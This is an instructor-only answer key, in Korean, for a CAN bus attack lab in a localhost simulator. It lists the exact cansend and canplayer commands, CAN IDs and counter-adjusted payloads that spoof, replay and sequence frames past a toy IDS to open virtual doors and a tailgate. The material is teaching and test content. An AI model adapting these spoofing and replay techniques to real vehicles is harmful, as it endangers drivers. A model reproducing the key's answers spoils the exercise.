# CAN 공격 실습 빠른 통과표 — 정답 포함

> **교사용 문서:** 정답 CAN ID, payload, 파일명이 포함되어 있으므로 학습자에게 배포하지 않는다. 아래 명령은 CANLite의 localhost Toy ECU/Toy IDS에서만 유효하며 실제 차량이나 OEM IDS 우회를 입증하지 않는다.

## 공통 Script 작동 방법

1. `Virtual terminal`에는 `pwd`, `ls`, `cat`, `candump` 같은 관찰·캡처 명령을 한 줄씩 입력한다.
2. 오른쪽 `Lab script`에는 최종 공격 동작을 입력한다. 예시 줄 앞의 `#`은 주석이므로 실행할 줄에서는 제거한다.
3. `스크립트 실행`을 누른 뒤 `Network monitor`, `Binary inspector`, `Toy IDS`, `Evidence/Proof`, GLB 차량 상태를 함께 확인한다.
4. 다시 검증할 때는 `실습 초기화`를 누른다. 브라우저 새로고침만으로는 현재 세션 상태가 초기화되지 않을 수 있다.

## A. 전체 공격 체인 — Door

### 1단계: 관찰과 실패하는 Replay 확인

`Virtual terminal`에서 순서대로 실행한다.

```text
pwd
ls
cat baseline.log
cat door-open.log
cansend vcan0 456#010110B5
```

마지막 명령 뒤 기대 결과:

- Stage: `Replay 실패`
- Toy IDS: `ALERT`
- Attempt: `COUNTER_REJECTED`
- 좌·우 문: 모두 닫힘
- Monitor 마지막 프레임: ID `0x456`, DATA `01 01 10 B5`

### 2단계: 유효한 시퀀스 제작

`Lab script` 내용을 전부 아래로 교체한 뒤 `스크립트 실행`을 누른다.

```text
interval_ms=100
cansend vcan0 456#000113B7
cansend vcan0 456#000114B0
cansend vcan0 456#000115B1
```

통과 기준:

- Stage: `증거`
- 세 프레임 verdict: 모두 `EXECUTED`
- Toy IDS: `NORMAL`
- Proof: `COMPLETE`
- Attempts: `4` (실패 Replay 1회 + 성공 프레임 3회)
- Monitor 마지막 DATA: `00 01 15 B1`
- GLB: Left Door만 열리고 Right Door는 닫힘

## B. CAN Spoofing 기초

### 1단계: 계약 관찰

`Virtual terminal`에서 순서대로 실행한다.

```text
pwd
ls
candump -L vcan0
cat message-map.txt
```

### 2단계: 위조 프레임 전송

`Lab script`를 아래처럼 작성한다. `cansend` 줄 앞에 `#`을 붙이지 않는다.

```text
# final action
cansend vcan0 5A1#01
```

통과 기준:

- Stage: `EVIDENCE`
- Last verdict: `EXECUTED`
- Toy IDS: `NORMAL`
- Attempts: `1`, Completed: `YES`
- Monitor: 관찰 프레임과 live 프레임을 합쳐 `2`행
- Binary inspector의 live DATA: `01`
- GLB: Tailgate만 열림

## C. CAN Replay 기초

### 1단계: 정상 프레임 캡처

`Virtual terminal`에서 순서대로 실행한다.

```text
candump -L vcan0 > capture.log
cat capture.log
```

첫 명령 뒤 Stage가 `CAPTURE`, verdict가 `CAPTURED`인지 확인한다.

### 2단계: 캡처 재생

`Lab script`를 아래처럼 작성한다. `canplayer` 줄 앞에 `#`을 붙이지 않는다.

```text
# final action
canplayer -I capture.log -l 1
```

통과 기준:

- Stage: `EVIDENCE`
- Last verdict: `EXECUTED`
- Toy IDS: `NORMAL`
- Attempts: `1`, Completed: `YES`
- Monitor: capture와 live 프레임을 합쳐 `2`행
- 두 프레임 DATA: 모두 `00 01`
- GLB: Left Door만 열림

초기화 직후 캡처 없이 재생하면 `CAPTURE_REQUIRED`가 나오는 것이 정상이다.

## 실패할 때 먼저 확인할 것

- action 줄이 아직 `#`으로 시작하는가
- Spoofing/Replay script에 최종 action이 두 줄 이상 있는가
- Door의 `interval_ms`가 `10..2000` 범위를 벗어났는가
- Replay에서 캡처 전에 재생했거나 파일명을 다르게 입력했는가
- `Network monitor`에서 선택한 행과 `Binary inspector`의 DATA가 같은가
- 이전 실습 상태가 남아 있다면 `실습 초기화` 후 다시 시작했는가
